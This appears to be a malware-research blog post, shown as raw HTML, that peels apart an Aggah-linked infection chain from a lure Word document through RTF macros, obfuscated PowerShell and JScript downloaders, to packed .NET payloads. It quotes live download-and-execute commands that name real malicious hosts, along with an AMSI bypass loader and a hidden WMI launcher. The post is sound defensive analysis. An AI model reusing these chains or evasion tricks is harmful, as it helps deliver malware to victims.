<!DOCTYPE html>
<html>
<head>
    
        
<meta charset="utf-8">
<meta name="HandheldFriendly" content="True">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="referrer" content="no-referrer-when-downgrade">

<title>(Ab)using bash-fu to analyze recent Aggah sample  - MalwareLab.pl Research Notes</title>
<meta name="description" content="">

<link rel="alternate" type="application/rss+xml" title="RSS" href="https://blog.malwarelab.pl/rss/">

<link rel="icon" type="image/x-icon" href="https://blog.malwarelab.pl/favicon.ico">
<link rel="apple-touch-icon-precomposed" href="https://blog.malwarelab.pl/favicon.png">

<link rel="stylesheet" href="https://blog.malwarelab.pl/static/css/style.css?rnd=1593086112" />

<meta property="og:title" content="(Ab)using bash-fu to analyze recent Aggah sample" />
<meta property="og:description" content="Intro Recently one of my generic signatures for malformed documents was hit, this type of malformation was used mostly by Zebrocy so i was curious whats cooking. After some analysis it turns out that last stage uses tools that are publicly attributed to Aggah, but to get that we need to tear through multiple layers of downloading scripts. We probably could just run our lure document and collect dropped binaries in a sandbox but where is fun of that?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://blog.malwarelab.pl/posts/basfu_aggah/" />
<meta property="article:published_time" content="2020-02-26T13:24:15+01:00" />
<meta property="article:modified_time" content="2020-02-26T13:24:15+01:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="(Ab)using bash-fu to analyze recent Aggah sample"/>
<meta name="twitter:description" content="Intro Recently one of my generic signatures for malformed documents was hit, this type of malformation was used mostly by Zebrocy so i was curious whats cooking. After some analysis it turns out that last stage uses tools that are publicly attributed to Aggah, but to get that we need to tear through multiple layers of downloading scripts. We probably could just run our lure document and collect dropped binaries in a sandbox but where is fun of that?"/>








    
</head>
<body>
    <div class="container">
        <header> 
            
                <h1 class="site-header">
    <a href="https://blog.malwarelab.pl">MalwareLab.pl Research Notes</a>
</h1>
<nav>
    
    
</nav>

            
        </header>
        <main>
            

    <article class="post">
        <header>
            <h1>(Ab)using bash-fu to analyze recent Aggah sample</h1>
        </header>
        <div class="content">
            <h1 id="intro">Intro</h1>
<p>Recently one of my generic signatures for malformed documents was hit, this type of malformation was used mostly by Zebrocy so i was curious whats cooking.
After some analysis it turns out that last stage uses tools that are publicly attributed to Aggah, but to get that we need to tear through multiple layers of downloading scripts.
We probably could just run our lure document and collect dropped binaries in a sandbox but where is fun of that? Let&rsquo;s do some work and abuse bash in order to obtain next stages!</p>
<h1 id="lure-document">Lure document</h1>
<p>File that cought my attention is <code>47625e693220465ced292aefd7c61fffc77dedd01618432da177a3b89525be9b</code> uploaded with a name <strong>Updated Pre-Contract.docx</strong> from Honk Kong. File is broken its missing one byte and libreoffice refuses to open it, but we can easly fix that!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>cat /tmp/b93291c5560551ffd4e7f1545c07f403.bin ; printf <span style="color:#e6db74">&#34;\x00&#34;</span> <span style="color:#f92672">)</span> &gt; fix.doc
</code></pre></div><p>and we are presented with very blurred jpg embedded in document
<img src="/static/blog/img/bashfu_aggah.screen.png" alt=""></p>
<p>we can also skip fixing phase and use 7zip to unpack content of the file, but we need screenshot of a doc right? ;]</p>
<p>Anyhow looking into file with 7zip is always a good idea which may give a clue what to look for</p>
<pre><code>Path = /tmp/b93291c5560551ffd4e7f1545c07f403.bin
Type = zip
ERRORS:
Unexpected end of archive
Physical Size = 39441

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
1980-01-01 00:00:00 .....         2017          414  [Content_Types].xml
1980-01-01 00:00:00 .....          737          254  _rels/.rels
1980-01-01 00:00:00 .....         3781         1146  word/document.xml
1980-01-01 00:00:00 .....         1509          315  word/_rels/document.xml.rels
1980-01-01 00:00:00 .....         8814         8814  word/media/image1.jpg
1980-01-01 00:00:00 .....         6795         1571  word/theme/theme1.xml
1980-01-01 00:00:00 .....         2938         1065  word/settings.xml
1980-01-01 00:00:00 .....          213          151  customXml/item1.xml
1980-01-01 00:00:00 .....          335          243  customXml/itemProps1.xml
1980-01-01 00:00:00 .....        58402         7000  customXml/item2.xml
1980-01-01 00:00:00 .....         1088          410  customXml/itemProps2.xml
1980-01-01 00:00:00 .....         9799         1724  customXml/item3.xml
1980-01-01 00:00:00 .....          486          292  customXml/itemProps3.xml
1980-01-01 00:00:00 .....        31158         2054  word/numbering.xml
1980-01-01 00:00:00 .....        55478         5110  word/styles.xml
1980-01-01 00:00:00 .....          655          295  word/webSettings.xml
1980-01-01 00:00:00 .....         2480          584  word/fontTable.xml
1980-01-01 00:00:00 .....          746          373  docProps/core.xml
1980-01-01 00:00:00 .....          997          476  docProps/app.xml
1980-01-01 00:00:00 .....         1036          362  docProps/custom.xml
1980-01-01 00:00:00 .....          296          194  customXml/_rels/item1.xml.rels
1980-01-01 00:00:00 .....          296          194  customXml/_rels/item2.xml.rels
1980-01-01 00:00:00 .....          296          195  customXml/_rels/item3.xml.rels
2020-02-23 22:41:26 .....          369          224  word/_rels/settings.xml.rels
------------------- ----- ------------ ------------  ------------------------
2020-02-23 22:41:26             190721        33460  24 files
</code></pre><p>What stands out immediately is a date of <strong>word/_rels/settings.xml.rels</strong> so this doc is most likely abusing Ole2Link property to load remote content,</p>
<pre><code>$ extrOle2Link.py /tmp/b93291c5560551ffd4e7f1545c07f403.bin 
[!] broken zip - missing 1 bytes
[+] HTTP-Ole2Link in http://office-archives.duckdns.org/cloud/clearance.rtf?raw=true in file word/_rels/settings.xml.rels
</code></pre><p>And indeed it does. You can find this simple script <a href="https://gist.github.com/mak/87016590dfc2f42624c78f634a2738d1">here</a></p>
<h1 id="rtf---clearancertf">RTF - clearance.rtf</h1>
<p>We got a next stage <code>17a8d46df8cdf7db3f9996a25dce7c78abb0cef0d7d55d94d39caf880801466b</code>. Lets look inside!</p>
<pre><code>id |index     |OLE Object                                                     
---+----------+---------------------------------------------------------------
0  |00002CADh |format_id: 2 (Embedded)                                        
   |          |class name: 'Excel.Sheet.8'                                    
   |          |data size: 39936                                               
   |          |MD5 = 'bf1d62dff81856a2784046b4d3eeab67'                       
   |          |CLSID: 00020820-0000-0000-C000-000000000046                    
   |          |Microsoft Microsoft Excel 97-2003 Worksheet (Excel.Sheet.8)    

(...)
---+----------+---------------------------------------------------------------
9  |000F73F1h |format_id: 2 (Embedded)                                        
   |          |class name: 'Excel.Sheet.8'                                    
   |          |data size: 39936                                               
   |          |MD5 = 'bb74ebb70450688af0c862b46c427eec'                       
   |          |CLSID: 00020820-0000-0000-C000-000000000046                    
   |          |Microsoft Microsoft Excel 97-2003 Worksheet (Excel.Sheet.8)    
---+----------+---------------------------------------------------------------
</code></pre><p>Ugh a lot, but all of them contain the same macro,</p>
<pre><code>Private Sub Workbook_BeforeClose(Cancel As Boolean)
'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox
'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox


'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox
'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox

Worksheets(1).Activate
A = Range(&quot;C3&quot;).Comment.Text
cv = StrReverse(Range(&quot;C4&quot;).Comment.Text)
Call CC0(A, cv)
End Sub


Function CC0(Str, cv)
'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox

Set BMMMEWEUUERTRT = CreateObject(cv)
BMMMEWEUUERTRT.Exec (StrReverse(Str))
End Function
</code></pre><p>Here we should propably turn into python library that can view or manipulate xml files such as xlrd but this time we are lucky, applying <code>strings(1)</code> on ole files quickly yields an powershell code</p>
<pre><code>llehS.tpircSW&lt;
)0,&quot;&quot;&quot;)'sj.duolc\'+ 'ATADPPA:vne$'(ssecorp-trats ;XEI|')''sj.duolc\''+''ATADPPA:vne$'',''sj.nitup/ADN/rg.wercsutats.www//:ptth''(e'+'liF'+'dao'+'ln'+'woD.'+')tne'+'ilC'+'beW'+'.t'+'eN' +')*O'+'-W* '+'M'+'C'+'G('+'&amp;(' llehsrewoP&quot;&quot;&quot;(nuR.t$;llehs.tpircsW moC- tcejbO-weN =t$ llehsrewop nim/ trats c/ dmc&lt;
Windows UserT
</code></pre><p>after reversing string, we got proper code,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">&lt;cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(<span style="color:#e6db74">&#34;&#34;&#34;Powershell &#39;(&amp;&#39;+&#39;(G&#39;+&#39;C&#39;+&#39;M&#39;+&#39; *W-&#39;+&#39;O*)&#39;+ &#39;Ne&#39;+&#39;t.&#39;+&#39;Web&#39;+&#39;Cli&#39;+&#39;ent)&#39;+&#39;.Dow&#39;+&#39;nl&#39;+&#39;oad&#39;+&#39;Fil&#39;+&#39;e(&#39;&#39;http://www.statuscrew.gr/NDA/putin.js&#39;&#39;,&#39;&#39;$env:APPDATA&#39;&#39;+&#39;&#39;\cloud.js&#39;&#39;)&#39;|IEX; start-process(&#39;$env:APPDATA&#39; +&#39;\cloud.js&#39;)&#34;&#34;&#34;</span>,0)
</code></pre></div><p>All of the OLE files have the same ps payload but we should verify that!</p>
<pre><code class="language-strings" data-lang="strings">&lt;cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(&quot;&quot;&quot;Powershell '(&amp;'+'(G'+'C'+'M'+' *W-'+'O*)'+ 'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\cloud.js'')'|IEX; start-process('$env:APPDATA' +'\cloud.js')&quot;&quot;&quot;,0)
&lt;cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(&quot;&quot;&quot;Powershell '(&amp;'+'(G'+'C'+'M'+' *W-'+'O*)'+ 'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\cloud.js'')'|IEX; start-process('$env:APPDATA' +'\cloud.js')&quot;&quot;&quot;,0)
&lt;cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(&quot;&quot;&quot;Powershell '(&amp;'+'(G'+'C'+'M'+' *W-'+'O*)'+ 'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\cloud.js'')'|IEX; start-process('$env:APPDATA' +'\cloud.js')&quot;&quot;&quot;,0)
&lt;cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(&quot;&quot;&quot;Powershell '(&amp;'+'(G'+'C'+'M'+' *W-'+'O*)'+ 'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\cloud.js'')'|IEX; start-process('$env:APPDATA' +'\cloud.js')&quot;&quot;&quot;,0)
&lt;cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(&quot;&quot;&quot;Powershell '(&amp;'+'(G'+'C'+'M'+' *W-'+'O*)'+ 'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\cloud.js'')'|IEX; start-process('$env:APPDATA' +'\cloud.js')&quot;&quot;&quot;,0)
&lt;cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(&quot;&quot;&quot;Powershell '(&amp;'+'(G'+'C'+'M'+' *W-'+'O*)'+ 'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\cloud.js'')'|IEX; start-process('$env:APPDATA' +'\cloud.js')&quot;&quot;&quot;,0)
&lt;cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(&quot;&quot;&quot;Powershell '(&amp;'+'(G'+'C'+'M'+' *W-'+'O*)'+ 'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\cloud.js'')'|IEX; start-process('$env:APPDATA' +'\cloud.js')&quot;&quot;&quot;,0)
&lt;cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(&quot;&quot;&quot;Powershell '(&amp;'+'(G'+'C'+'M'+' *W-'+'O*)'+ 'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\cloud.js'')'|IEX; start-process('$env:APPDATA' +'\cloud.js')&quot;&quot;&quot;,0)
&lt;cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(&quot;&quot;&quot;Powershell '(&amp;'+'(G'+'C'+'M'+' *W-'+'O*)'+ 'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\cloud.js'')'|IEX; start-process('$env:APPDATA' +'\cloud.js')&quot;&quot;&quot;,0)
&lt;cmd /c start /min powershell $t= New-Object -Com Wscript.shell;$t.Run(&quot;&quot;&quot;Powershell '(&amp;'+'(G'+'C'+'M'+' *W-'+'O*)'+ 'Ne'+'t.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Fil'+'e(''http://www.statuscrew.gr/NDA/putin.js'',''$env:APPDATA''+''\cloud.js'')'|IEX; start-process('$env:APPDATA' +'\cloud.js')&quot;&quot;&quot;,0)
</code></pre><h1 id="jscript---putinjs">JScript - Putin.js</h1>
<p>Next stage (<code>854a0a9603b288cdf01fdcd0cc7feffb8393d35a80fca6ad981575cbe207aee4</code>) is a JScript, lets take a look.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">f=<span style="color:#e6db74">&#34;K|&#39;&#39; nioj- u4ju435h43u3huhufdhnj$]][rahc[;)77,421,93,93,23,0mossad,501,mossad1,601,54,23,5mossad,4mossad,79,401,76,501,501,99,5mossad,79,63,23,16,301,0mossad,501,4mossad,6mossad,38,501,501,99,5mossad,79,63,95,521,43,59,63,021,84,43,39,101,6mossad,121,89,19,39,4mossad,79,401,99,19,321,23,6mossad,99,101,601,89,97,54,401,99,79,96,4mossad,mossad1,07,421,23,93,54,93,23,6mossad,501,801,2mossad,5mossad,54,23,121,6mossad,63,23,16,5mossad,4mossad,79,401,76,501,501,99,5mossad,79,63,95,6mossad,021,101,48,101,5mossad,0mossad,mossad1,2mossad,5mossad,101,4mossad,64,6mossad,63,16,121,6mossad,63,95,14,04,001,0mossad,101,5mossad,64,6mossad,63,95,14,101,5mossad,801,79,201,63,44,93,301,2mossad,601,64,6mossad,99,79,201,74,101,99,501,201,201,mossad1,74,4mossad,201,64,5mossad,101,501,99,mossad1,5mossad,5mossad,79,4mossad,101,501,8mossad,0mossad,79,601,74,74,85,2mossad,6mossad,6mossad,401,93,44,93,48,96,17,93,04,0mossad,101,2mossad,mossad1,64,6mossad,63,95,08,48,48,27,67,77,88,64,6mossad,201,mossad1,5mossad,mossad1,4mossad,99,501,77,23,901,mossad1,76,54,23,6mossad,99,101,601,89,97,54,9mossad,101,87,23,16,6mossad,63,95,05,05,2mossad,&#34;</span>
f=f+<span style="color:#e6db74">&#34;63,23,16,23,801,mossad1,99,mossad1,6mossad,mossad1,4mossad,08,121,6mossad,501,4mossad,7mossad,99,101,38,85,85,39,4mossad,101,301,79,0mossad,79,77,6mossad,0mossad,501,mossad1,08,101,99,501,8mossad,4mossad,101,38,64,6mossad,101,87,64,901,101,6mossad,5mossad,121,38,19,95,14,05,55,84,15,23,44,39,101,2mossad,121,48,801,mossad1,99,mossad1,6mossad,mossad1,4mossad,08,121,6mossad,501,4mossad,7mossad,99,101,38,64,6mossad,101,87,64,901,101,6mossad,5mossad,121,38,19,04,6mossad,99,101,601,89,97,mossad1,48,85,85,39,901,7mossad,0mossad,96,19,23,16,23,05,05,2mossad,63,95,14,301,0mossad,501,2mossad,63,04,23,801,501,6mossad,0mossad,7mossad,23,521,6mossad,101,501,7mossad,18,54,23,94,23,6mossad,0mossad,7mossad,mossad1,99,54,23,901,mossad1,99,64,101,801,301,mossad1,mossad1,301,23,2mossad,901,mossad1,99,54,23,0mossad,mossad1,501,6mossad,99,101,0mossad,0mossad,mossad1,99,54,6mossad,5mossad,101,6mossad,23,16,23,301,0mossad,501,2mossad,63,321,23,mossad1,001,95,101,0mossad,mossad1,89,48,63,23,77,23,801,79,5mossad,95,14,93,37,93,44,93,24,93,04,101,99,79,801,2mossad,101,4mossad,64,93,88,96,24,93,16,101,0mossad,mossad1,89,48,63(@=u4ju435h43u3huhufdhnj$;)&#39;&#39; nioj- &#39;X&#39;,&#39;E&#39;,)&#39;I&#39;,&#39;#&#39;(ecalper.&#39;#&#39;( K las&#34;</span>



AT(<span style="color:#e6db74">&#34;Powershell &#34;</span> + REVERSE(replaceAll(f)))


var CurrentDirectory =WScript.ScriptFullName

AT(<span style="color:#e6db74">&#34;Powershell &#34;</span> +<span style="color:#e6db74">&#34;Remove-Item  &#39;&#34;</span> + CurrentDirectory+<span style="color:#e6db74">&#34;&#39;&#34;</span>)


<span style="color:#66d9ef">function</span> AT(strCommand){
var strComputer = <span style="color:#e6db74">&#34;.&#34;</span>;
   var strCommand = strCommand;
   var objWMIService = GetObject(<span style="color:#e6db74">&#34;winmgmts:\\\\&#34;</span> + strComputer +
<span style="color:#e6db74">&#34;\\root\\CIMV2&#34;</span>);
   var objProcess = objWMIService.Get(<span style="color:#e6db74">&#34;Win32_Process&#34;</span>);
   var objInParam =
objProcess.Methods_(<span style="color:#e6db74">&#34;Create&#34;</span>).inParameters.SpawnInstance_();
   var objStartup =
objWMIService.Get(<span style="color:#e6db74">&#34;Win32_ProcessStartup&#34;</span>).SpawnInstance_();
   objStartup.ShowWindow = 0;
   objInParam.CommandLine = strCommand;
   objInParam.ProcessStartupInformation = objStartup;
      var objOutParams = objWMIService.ExecMethod( <span style="color:#e6db74">&#34;Win32_Process&#34;</span>,
<span style="color:#e6db74">&#34;Create&#34;</span>, objInParam );
}

<span style="color:#66d9ef">function</span> replaceAll(str) {
    <span style="color:#66d9ef">return</span> str.split(<span style="color:#e6db74">&#34;mossad&#34;</span>).join(<span style="color:#e6db74">&#34;11&#34;</span>);
</code></pre></div><p>This script will fire encoded powershell and clean all files dropped after it execution. Using WMI instead ordinarily spawning a cmd.exe is a nice addition. Whats inside encoded blob?</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$ cat putin.js | grep <span style="color:#e6db74">&#39;f=&#39;</span> | cut -d<span style="color:#e6db74">&#39;&#34;&#39;</span> -f2 | tr -d <span style="color:#e6db74">&#34;\n&#34;</span> | sed -e<span style="color:#e6db74">&#39;s/mossad/11/g&#39;</span>|rev |cut -d<span style="color:#e6db74">&#39;;&#39;</span> -f2|cut -d<span style="color:#e6db74">&#39;(&#39;</span> -f2 | tr -d <span style="color:#e6db74">&#34;)&#34;</span> | tr , <span style="color:#e6db74">&#34;\n&#34;</span> | <span style="color:#66d9ef">while</span> read a; <span style="color:#66d9ef">do</span> printf \\$(printf <span style="color:#e6db74">&#39;%03o&#39;</span> $a); $a; done
$Tbone=<span style="color:#e6db74">&#39;*EX&#39;</span>.replace(<span style="color:#e6db74">&#39;*&#39;</span>,<span style="color:#e6db74">&#39;I&#39;</span>);sal M $Tbone;<span style="color:#66d9ef">do</span> {$ping = test-connection -comp google.com -count 1 -Quiet} <span style="color:#66d9ef">until</span> ($ping);$p22 = <span style="color:#66d9ef">[Enum]</span>::ToObject(<span style="color:#66d9ef">[System.Net.SecurityProtocolType]</span>, 3072);<span style="color:#66d9ef">[System.Net.ServicePointManager]</span>::SecurityProtocol = $p22;$t= New-Object -Com Microsoft.XMLHTTP;$t.open(<span style="color:#e6db74">&#39;GET&#39;</span>,<span style="color:#e6db74">&#39;http://janvierassocies.fr/office/fact.jpg&#39;</span>,$false);$t.send();$ty=$t.responseText;$asciiChars= $ty -split <span style="color:#e6db74">&#39;-&#39;</span> |<span style="color:#66d9ef">ForEach</span>-Object {<span style="color:#66d9ef">[char][byte]</span><span style="color:#e6db74">&#34;0x$_&#34;</span>};$asciiString= $asciiChars -join <span style="color:#e6db74">&#39;&#39;</span>|M
</code></pre></div><p>Well another downloader.</p>
<h1 id="powershell---factjpg">Powershell - fact.jpg</h1>
<p><strong>fact.jpg</strong> (<code>59012e676ed866ba013b1d950d1ef0558d7ea09e0a764ff65ee5b43663e918ea</code>) is just a text file with hex encoded powershell separated by dashes</p>
<pre><code class="language-$" data-lang="$">00000000: 3636 2d37 352d 3645 2d36 332d 3734 2d36  66-75-6E-63-74-6
00000010: 392d 3646 2d36 452d 3230 2d35 352d 3445  9-6F-6E-20-55-4E
00000020: 2d37 302d 3631 2d34 332d 3330 2d36 422d  -70-61-43-30-6B-
00000030: 3333 2d33 332d 3333 2d33 332d 3333 2d33  33-33-33-33-33-3
00000040: 302d 3330 2d33 302d 3330 2d33 312d 3331  0-30-30-30-31-31
00000050: 2d33 342d 3337 2d33 352d 3335 2d33 352d  -34-37-35-35-35-
00000060: 3230 2d37 422d 3044 2d30 412d 3044 2d30  20-7B-0D-0A-0D-0
00000070: 412d 3039 2d35 422d 3433 2d36 442d 3634  A-09-5B-43-6D-64
00000080: 2d36 432d 3635 2d37 342d 3432 2d36 392d  -6C-65-74-42-69-
00000090: 3645 2d36 342d 3639 2d36 452d 3637 2d32  6E-64-69-6E-67-2
</code></pre><p>lets decode it.</p>
<pre><code>$ cat fact.jpg  | tr &quot;-&quot; &quot;\n&quot; | while read n ; do chr $((16#$n)); done &gt; x.ps1

</code></pre><p>Here we need to cheat a little and abandon bash as its very slow to decode this big file (4.7MB) byte-by-byte. So we turn to python for help</p>
<pre><code>cat fact.jpg  |  python2 -c 'import sys; print &quot;&quot;.join(map(lambda x: chr(int(x,16)),sys.stdin.read().split(&quot;-&quot;)))'  &gt; x.ps1
</code></pre><p>here is cleared code of the script</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">
<span style="color:#66d9ef">function</span> UNpaC0k3333300001147555 {

	[<span style="color:#66d9ef">CmdletBinding</span>()]
    <span style="color:#66d9ef">Param</span> (<span style="color:#66d9ef">[byte[]]</span> $byteArray)
 
	<span style="color:#66d9ef">Process</span> {
	    Write-Verbose <span style="color:#e6db74">&#34;Get-DecompressedByteArray&#34;</span>
        $input = New-Object System.IO.MemoryStream( , $byteArray )
	    $output = New-Object System.IO.MemoryStream
            $01774000 = New-Object System.IO.Compression.GzipStream $input, (<span style="color:#66d9ef">[IO.Compression.CompressionMode]</span>::Decompress)

    $puffpass = New-Object byte[](1024)
    <span style="color:#66d9ef">while</span>($true){
        $read = $01774000.Read($puffpass, 0, 1024)
        <span style="color:#66d9ef">if</span> ($read <span style="color:#f92672">-le</span> 0){<span style="color:#66d9ef">break</span>}
        $output.Write($puffpass, 0, $read)
        }
        
        
		<span style="color:#66d9ef">[byte[]]</span> $bout333 = $output.ToArray()
        Write-Output $bout333
    }
}
$t0=<span style="color:#e6db74">&#39;DEX&#39;</span>.replace(<span style="color:#e6db74">&#39;D&#39;</span>,<span style="color:#e6db74">&#39;I&#39;</span>);sal g $t0;<span style="color:#66d9ef">[Byte[]]</span>$MNB=(<span style="color:#e6db74">&#39;@!1F,@!8B,@!08,@!00,@!00...&#39;</span>).replace(<span style="color:#e6db74">&#39;@!&#39;</span>,<span style="color:#e6db74">&#39;0x&#39;</span>))| g;
<span style="color:#66d9ef">[Byte[]]</span>$blindB=(<span style="color:#e6db74">&#39;@!1F,@!8B,@!08...&#39;</span>).replace(<span style="color:#e6db74">&#39;@!&#39;</span>,<span style="color:#e6db74">&#39;0x&#39;</span>))| g

<span style="color:#66d9ef">[byte[]]</span>$deblindB = UNpaC0k3333300001147555 $blindB

$blind=<span style="color:#66d9ef">[System.Reflection.Assembly]</span>::Load($deblindB)
<span style="color:#66d9ef">[Amsi]</span>::Bypass()

<span style="color:#66d9ef">[byte[]]</span>$decompressedByteArray = UNpaC0k3333300001147555  $MNB
<span style="color:#66d9ef">[Byte[]]</span>$MNB2=(<span style="color:#e6db74">&#39;@!4D,@!5A...&#39;</span>).replace(<span style="color:#e6db74">&#39;@!&#39;</span>,<span style="color:#e6db74">&#39;0x&#39;</span>))| g
$t=<span style="color:#66d9ef">[System.Reflection.Assembly]</span>::Load($decompressedByteArray)
<span style="color:#66d9ef">[rOnAlDo]</span>::ChRiS(<span style="color:#e6db74">&#39;InstallUtil.exe&#39;</span>,$MNB2)

</code></pre></div><p>This script will load into memory 3 binaries, two of them compressed one not, based on a script we can assume that the last one is the final payload and others are used for loading.
Lets extract them.</p>
<pre><code>cat x.ps1 | grep 'blind' | head -n1 | cut -d &quot;'&quot; -f2 | sed -e 's/@!//g' | python2 -c 'import sys;sys.stdout.write(&quot;&quot;.join(map(lambda x: chr(int(x,16)),sys.stdin.read().split(&quot;,&quot;))))'  |zcat - &gt; amsi.bin
cat x.ps1 | grep 'MNB' | head -n1 | cut -d &quot;'&quot; -f2 | sed -e 's/@!//g' | python2 -c 'import sys;sys.stdout.write(&quot;&quot;.join(map(lambda x: chr(int(x,16)),sys.stdin.read().split(&quot;,&quot;))))'  |zcat - &gt; loader.bin
cat x.ps1 | grep 'MNB2' | head -n1 | cut -d &quot;'&quot; -f2 | sed -e 's/@!//g' | python2 -c 'import sys;sys.stdout.write(&quot;&quot;.join(map(lambda x: chr(int(x,16)),sys.stdin.read().split(&quot;,&quot;))))'  &gt; payload.bin
</code></pre><h1 id="endgame">EndGame</h1>
<table>
<thead>
<tr>
<th>Name</th>
<th>Hash</th>
<th>Type</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>amsi.bin</td>
<td>e4d14ba73670184066a00cf5d3361580f6c4fbc5d0862a90278d82e95426faa5</td>
<td>PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows</td>
<td>Packed with ConfuserEx v1.0.0</td>
</tr>
<tr>
<td>loader.bin</td>
<td>8ed29945294e0ba0ae9d5c94c3871dfb00eb9c32b2c7a7704005b31642977a02</td>
<td>PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows</td>
<td>Packed with Unknown Obfuscator</td>
</tr>
<tr>
<td>payload.bin</td>
<td>4cd35bcc7793a04daa0c20774ff2a60c3f1ae693964011cb34d13544dda8b500</td>
<td>PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows</td>
<td>Packed with ConfuserEx</td>
</tr>
</tbody>
</table>
<p>While dealing with .NET malware dnSpy is your best friend, and while it doesn&rsquo;t have a flashy gui when used under Linux systems we can still use it to quickly asses whats going on using its console version and mono. After decompilation and looking into <code>&lt;Module&gt;.cs</code> file we can see a control flow obfuscation known as CFG flattening typical to ConfuserEX so lets remove it using <a href="https://github.com/ViRb3/de4dot-cex">modifed de4dot</a>. Much better, but still nothing obvious to determine family and C2 address. At the top of the now cleared <code>&lt;Module&gt;.cs</code> we can see a decryption function</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#66d9ef">internal</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">string</span> smethod_0(<span style="color:#66d9ef">int</span> int_0)
{
        <span style="color:#66d9ef">object</span>[] array = &lt;Module&gt;.object_0;
        <span style="color:#66d9ef">if</span> (Assembly.GetExecutingAssembly() == Assembly.GetCallingAssembly())
        {
                <span style="color:#66d9ef">byte</span>[] array2 = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">32</span>];
                <span style="color:#66d9ef">byte</span>[] array3 = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">16</span>];
                <span style="color:#66d9ef">int</span> num = int_0 &gt;&gt; <span style="color:#ae81ff">2</span>;
                num = num - <span style="color:#ae81ff">8</span> + <span style="color:#ae81ff">673</span> - <span style="color:#ae81ff">34893</span>;
                num = (num ^ <span style="color:#ae81ff">673</span> ^ <span style="color:#ae81ff">4398</span>);
                num -= <span style="color:#ae81ff">831</span>;
                num = (num - <span style="color:#ae81ff">673</span>) / <span style="color:#ae81ff">8</span>;
                <span style="color:#66d9ef">uint</span>[] array4 = (<span style="color:#66d9ef">uint</span>[])array[num];
                <span style="color:#66d9ef">byte</span>[] array5 = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[array4.Length * <span style="color:#ae81ff">4</span>];
                Buffer.BlockCopy(array4, <span style="color:#ae81ff">0</span>, array5, <span style="color:#ae81ff">0</span>, array4.Length * <span style="color:#ae81ff">4</span>);
                <span style="color:#66d9ef">byte</span>[] array6 = array5;
                <span style="color:#66d9ef">int</span> num2 = array6.Length - <span style="color:#ae81ff">48</span>;
